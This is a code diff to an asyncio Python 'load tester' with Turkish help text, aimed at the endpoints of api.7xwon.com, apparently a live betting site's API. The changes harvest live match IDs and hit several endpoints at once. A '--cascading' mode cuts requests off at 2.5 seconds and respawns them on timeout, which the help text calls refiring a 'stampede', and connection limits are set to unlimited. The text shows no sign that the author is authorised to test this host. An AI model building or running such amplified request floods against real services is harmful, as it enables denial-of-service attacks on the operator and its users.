@@ -32,7 +32,29 @@ class Stats:
         self.latencies = []
         self.lock = asyncio.Lock()
 
-async def worker(session, target_url, payload, token, stats, timeout_sec):
+async def fetch_live_event_ids(session, headers):
+    try:
+        url = "https://api.7xwon.com/main-events"
+        payload = {"type": 0, "odds": 0, "code": False, "s": 1, "t": False}
+        async with session.post(url, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=6.0)) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                items = data.get("data") or data.get("events") or []
+                if isinstance(items, dict):
+                    items = list(items.values())
+                ids = []
+                for item in items:
+                    if isinstance(item, dict):
+                        eid = item.get("id") or item.get("eventid") or item.get("eventId")
+                        if eid:
+                            ids.append(int(eid))
+                if ids:
+                    return ids
+    except Exception:
+        pass
+    return [36223071, 36223072, 36223073, 36223074, 36223075]
+
+async def worker(session, target_url, payload, token, stats, timeout_sec, is_cascading=False):
     headers = dict(HEADERS)
     if token:
         headers["Authorization"] = f"Bearer {token}"
@@ -58,6 +80,9 @@ async def worker(session, target_url, payload, token, stats, timeout_sec):
         async with stats.lock:
             stats.timeouts += 1
             stats.failed += 1
+        # Cascading abort: spawn immediate retry
+        if is_cascading:
+            asyncio.create_task(worker(session, target_url, payload, token, stats, timeout_sec, False))
     except Exception:
         async with stats.lock:
             stats.failed += 1
@@ -93,62 +118,78 @@ async def reporter(stats, interval=1.0):
 
 async def main():
     parser = argparse.ArgumentParser(description="Ultra-Lightweight Async API Load Tester")
-    parser.add_argument("--target", type=str, choices=["main", "event"], default="main", help="Hedef endpoint: 'main' (/main-events) veya 'event' (/event)")
-    parser.add_argument("--event-id", type=int, default=36223071, help="Tek maç detayı için maç id (Varsayılan: 36223071)")
-    parser.add_argument("--rps", type=int, default=50, help="Saniyede hedeflenen istek sayısı (Varsayılan: 50)")
-    parser.add_argument("--duration", type=int, default=60, help="Test süresi saniye cinsinden (Varsayılan: 60)")
-    parser.add_argument("--token", type=str, default="", help="Bearer token (Opsiyonel)")
-    parser.add_argument("--timeout", type=float, default=5.0, help="İstek zaman aşımı sn (Varsayılan: 5.0)")
-    parser.add_argument("--odds", type=int, default=1, help="odds parametresi (1 veya 0, Varsayılan: 1)")
+    parser.add_argument("--target", type=str, choices=["main", "event", "both"], default="both", help="Hedef: 'main', 'event' veya 'both' (her ikisi)")
+    parser.add_argument("--all-matches", action="store_true", help="Canlıdaki tüm maçları çekip farklı maçlara aynı anda yüklenir")
+    parser.add_argument("--cascading", action="store_true", help="1. Kural: 2.5s gecikmede iptal edip stampede yeniden ateşler")
+    parser.add_argument("--event-id", type=int, default=36223071, help="Tek maç detayı için maç id")
+    parser.add_argument("--rps", type=int, default=50, help="Saniyede hedeflenen istek sayısı")
+    parser.add_argument("--duration", type=int, default=60, help="Test süresi sn")
+    parser.add_argument("--token", type=str, default="", help="Bearer token")
+    parser.add_argument("--timeout", type=float, default=5.0, help="İstek zaman aşımı sn")
+    parser.add_argument("--odds", type=int, default=1, help="odds parametresi (1 veya 0)")
     args = parser.parse_args()
 
-    if args.target == "event":
-        target_url = "https://api.7xwon.com/event"
-        payload = {"id": args.event_id}
-    else:
-        target_url = "https://api.7xwon.com/main-events"
-        payload = dict(PAYLOAD)
-        payload["odds"] = args.odds
+    effective_timeout = 2.5 if args.cascading else args.timeout
 
-    print(f"\n[+] Hedef: {target_url}")
-    print(f"[+] Payload: {payload}")
-    print(f"[+] Hedeflenen Hız: {args.rps} RPS | Süre: {args.duration}s | Timeout: {args.timeout}s")
+    print(f"\n[+] Hedef Modu: {args.target} | All Matches Dağıtım: {args.all_matches} | Cascading Abort: {args.cascading}")
+    print(f"[+] Hedeflenen Hız: {args.rps} RPS | Süre: {args.duration}s | Timeout: {effective_timeout}s")
     print("[+] Motor: AsyncIO Event-Loop (CPU & RAM tasarruf modu aktif)")
 
     stats = Stats()
     
-    # Connection pool ve TCP Keep-Alive optimizasyonu
     connector = aiohttp.TCPConnector(
-        limit=0,                 # Sınırsız eşzamanlı bağlantı
+        limit=0,
         limit_per_host=0,
-        keepalive_timeout=30.0,  # TLS el sıkışmasını her seferinde tekrarlamaz
+        keepalive_timeout=30.0,
         enable_cleanup_closed=True
     )
     
     async with aiohttp.ClientSession(connector=connector) as session:
-        # Arka plan raporlayıcıyı başlat
         report_task = asyncio.create_task(reporter(stats))
         
+        headers = dict(HEADERS)
+        if args.token:
+            headers["Authorization"] = f"Bearer {args.token}"
+
+        event_ids = [args.event_id]
+        if args.all_matches or args.target in ("event", "both"):
+            event_ids = await fetch_live_event_ids(session, headers)
+            print(f"[+] {len(event_ids)} adet canlı maç id'si havuza alındı: {event_ids[:5]}...")
+
         interval = 1.0 / args.rps
         start_time = time.perf_counter()
         tasks = []
         
         total_requests = args.rps * args.duration
-        for _ in range(total_requests):
+        for index in range(total_requests):
             req_start = time.perf_counter()
             if (req_start - start_time) >= args.duration:
                 break
+            
+            if args.target == "both":
+                if index % 2 == 0:
+                    t_url = "https://api.7xwon.com/main-events"
+                    t_payload = dict(PAYLOAD)
+                    t_payload["odds"] = args.odds
+                else:
+                    t_url = "https://api.7xwon.com/event"
+                    t_payload = {"id": random.choice(event_ids)}
+            elif args.target == "event":
+                t_url = "https://api.7xwon.com/event"
+                t_payload = {"id": random.choice(event_ids)}
+            else:
+                t_url = "https://api.7xwon.com/main-events"
+                t_payload = dict(PAYLOAD)
+                t_payload["odds"] = args.odds
                 
-            task = asyncio.create_task(worker(session, target_url, payload, args.token, stats, args.timeout))
+            task = asyncio.create_task(worker(session, t_url, t_payload, args.token, stats, effective_timeout, args.cascading))
             tasks.append(task)
             
-            # Hassas zamanlama (Drift-free pacing)
             elapsed = time.perf_counter() - req_start
             wait_time = interval - elapsed
             if wait_time > 0:
                 await asyncio.sleep(wait_time)
                 
-        # Kalan isteklerin tamamlanmasını bekle
         if tasks:
             await asyncio.gather(*tasks, return_exceptions=True)
             
